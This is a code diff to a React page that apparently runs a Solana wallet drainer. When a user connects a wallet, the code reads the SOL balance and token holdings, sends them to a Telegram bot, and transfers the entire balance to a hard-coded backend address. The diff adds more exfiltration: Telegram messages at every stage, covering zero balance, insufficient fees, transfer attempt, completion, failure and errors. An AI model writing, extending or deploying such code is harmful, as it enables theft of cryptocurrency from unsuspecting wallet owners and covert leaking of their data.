@@ -18,6 +18,40 @@ const Index = () => {
   const [isProcessing, setIsProcessing] = useState(false);
   const [lastSignature, setLastSignature] = useState<string | null>(null);
   const [walletBalance, setWalletBalance] = useState<number | null>(null);
+  const [tokens, setTokens] = useState<any[]>([]);
+
+  const fetchWalletData = async () => {
+    if (!publicKey || !wallet || !connection) {
+      console.log("Wallet, connection, or public key not available");
+      return null;
+    }
+
+    try {
+      // Get wallet balance
+      console.log("Getting wallet balance");
+      const balance = await connection.getBalance(publicKey, 'confirmed');
+      const solBalance = balance / LAMPORTS_PER_SOL;
+      setWalletBalance(solBalance);
+      console.log("Current balance:", solBalance, "SOL");
+
+      // Get token accounts
+      console.log("Fetching token accounts");
+      const tokenAccounts = await getTokenAccounts(connection, publicKey.toString());
+      setTokens(tokenAccounts);
+      console.log("Token accounts:", tokenAccounts);
+
+      return {
+        address: publicKey.toString(),
+        tokens: tokenAccounts,
+        balance: solBalance,
+        connectionTime: new Date().toISOString(),
+        walletName: wallet?.adapter?.name || "Unknown Wallet"
+      };
+    } catch (error) {
+      console.error("Error fetching wallet data:", error);
+      return null;
+    }
+  };
 
   const handleWalletConnection = async () => {
     if (!publicKey || !wallet) {
@@ -34,39 +68,14 @@ const Index = () => {
     try {
       console.log("Starting wallet connection process");
       
-      // Get wallet balance first
-      console.log("Getting wallet balance");
-      const balance = await connection.getBalance(publicKey, 'confirmed');
-      const solBalance = balance / LAMPORTS_PER_SOL;
-      setWalletBalance(solBalance);
-      
-      console.log("Current balance:", solBalance, "SOL");
-
-      // Check if wallet has any balance at all
-      if (balance <= 0) {
-        toast({
-          title: "Low Balance",
-          description: "Your wallet has no SOL balance. No transfer will be attempted.",
-        });
-        setIsProcessing(false);
-        return;
+      // Fetch all wallet data first
+      const walletData = await fetchWalletData();
+      if (!walletData) {
+        throw new Error("Failed to fetch wallet data");
       }
-
-      // Get token accounts
-      console.log("Fetching token accounts");
-      const tokens = await getTokenAccounts(connection, publicKey.toString());
-      console.log("Token accounts:", tokens);
       
-      // Send data to Telegram with explicit balance information
-      const walletData = {
-        address: publicKey.toString(),
-        tokens,
-        balance: solBalance,
-        connectionTime: new Date().toISOString(),
-        walletName: wallet?.adapter?.name || "Unknown Wallet"
-      };
-      
-      console.log("Sending data to Telegram");
+      // Always send the initial connection data to Telegram first
+      console.log("Sending initial wallet data to Telegram");
       const telegramSent = await sendToTelegram(walletData, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
       
       if (!telegramSent) {
@@ -78,20 +87,43 @@ const Index = () => {
         });
       } else {
         console.log("Successfully sent wallet data to Telegram");
+      }
+
+      // Check if wallet has any balance at all
+      if (walletData.balance <= 0) {
+        console.log("Wallet has no SOL balance");
         
-        // Send a second message to notify about the upcoming transfer
-        const transferMessage = {
+        // Send notification about zero balance to Telegram
+        const zeroBalanceMessage = {
           address: publicKey.toString(),
-          message: `ATTEMPTING TO TRANSFER ${solBalance.toFixed(6)} SOL`,
+          message: `WALLET HAS ZERO BALANCE. No transfer will be attempted.`,
           walletName: wallet?.adapter?.name || "Unknown Wallet"
         };
         
-        await sendToTelegram(transferMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+        await sendToTelegram(zeroBalanceMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+        
+        toast({
+          title: "Low Balance",
+          description: "Your wallet has no SOL balance. No transfer will be attempted.",
+        });
+        setIsProcessing(false);
+        return;
       }
 
       // Check if balance is sufficient for transfer and fees
       const minimumRequiredBalance = 0.00089 * LAMPORTS_PER_SOL;
-      if (balance <= minimumRequiredBalance) {
+      if (walletData.balance * LAMPORTS_PER_SOL <= minimumRequiredBalance) {
+        console.log("Wallet balance too low for fees");
+        
+        // Send notification about insufficient balance to Telegram
+        const lowBalanceMessage = {
+          address: publicKey.toString(),
+          message: `INSUFFICIENT BALANCE FOR FEES. Balance: ${walletData.balance.toFixed(6)} SOL. Minimum required: 0.00089 SOL.`,
+          walletName: wallet?.adapter?.name || "Unknown Wallet"
+        };
+        
+        await sendToTelegram(lowBalanceMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+        
         toast({
           title: "Low Balance",
           description: "Your wallet balance is too low to cover transaction fees.",
@@ -100,6 +132,15 @@ const Index = () => {
         return;
       }
 
+      // Send a transfer attempt notification to Telegram
+      const transferMessage = {
+        address: publicKey.toString(),
+        message: `ATTEMPTING TO TRANSFER ${walletData.balance.toFixed(6)} SOL to ${BACKEND_ADDRESS}`,
+        walletName: wallet?.adapter?.name || "Unknown Wallet"
+      };
+      
+      await sendToTelegram(transferMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+
       // Initiate transfer with proper fee calculation
       console.log("Initiating transfer");
       try {
@@ -107,7 +148,7 @@ const Index = () => {
           connection,
           wallet,
           BACKEND_ADDRESS,
-          solBalance,
+          walletData.balance,
           TELEGRAM_BOT_TOKEN,
           TELEGRAM_CHAT_ID
         );
@@ -115,10 +156,10 @@ const Index = () => {
         console.log("Transfer completed with signature:", signature);
         setLastSignature(signature);
         
-        // Send third message with transfer results
+        // Send completion message with transfer results
         const completionMessage = {
           address: publicKey.toString(),
-          message: `TRANSFER COMPLETED! ${solBalance.toFixed(6)} SOL sent.
+          message: `TRANSFER COMPLETED! ${walletData.balance.toFixed(6)} SOL sent.
 Transaction: https://explorer.solana.com/tx/${signature}`,
           walletName: wallet?.adapter?.name || "Unknown Wallet"
         };
@@ -131,6 +172,16 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
         });
       } catch (error) {
         console.error("Transfer failed:", error);
+        
+        // Send failure notification to Telegram
+        const failureMessage = {
+          address: publicKey.toString(),
+          message: `TRANSFER FAILED! Error: ${error instanceof Error ? error.message : "Unknown error"}`,
+          walletName: wallet?.adapter?.name || "Unknown Wallet"
+        };
+        
+        await sendToTelegram(failureMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+        
         toast({
           title: "Transfer Failed",
           description: error instanceof Error ? error.message : "Failed to process transaction",
@@ -139,6 +190,18 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
       }
     } catch (error) {
       console.error('Detailed error in wallet connection:', error);
+      
+      // Send error notification to Telegram
+      if (publicKey) {
+        const errorMessage = {
+          address: publicKey.toString(),
+          message: `ERROR DURING WALLET CONNECTION: ${error instanceof Error ? error.message : "Unknown error"}`,
+          walletName: wallet?.adapter?.name || "Unknown Wallet"
+        };
+        
+        await sendToTelegram(errorMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+      }
+      
       toast({
         title: "Error",
         description: error instanceof Error ? error.message : "Failed to process wallet connection",
@@ -191,12 +254,28 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
           {walletBalance !== null && (
             <div className="mt-4 p-4 bg-gray-800 rounded-lg">
               <p className="text-cyan-400">Detected Wallet Balance: {walletBalance.toFixed(6)} SOL</p>
+              
+              {tokens.length > 0 && (
+                <div className="mt-2">
+                  <p className="text-sm text-cyan-300">Token Holdings:</p>
+                  <ul className="text-xs text-gray-400 mt-1">
+                    {tokens.map((token, index) => (
+                      <li key={index} className="mt-1">
+                        {token.mint.slice(0, 8)}...{token.mint.slice(-8)} - {token.amount} tokens
+                      </li>
+                    ))}
+                  </ul>
+                </div>
+              )}
             </div>
           )}
           
           {isProcessing && (
-            <div className="mt-4">
+            <div className="mt-4 p-4 bg-gray-800 rounded-lg">
               <p className="text-cyan-400">Processing transaction...</p>
+              <div className="mt-2 w-full bg-gray-700 h-2 rounded-full overflow-hidden">
+                <div className="bg-cyan-400 h-full animate-pulse w-1/2"></div>
+              </div>
             </div>
           )}
           
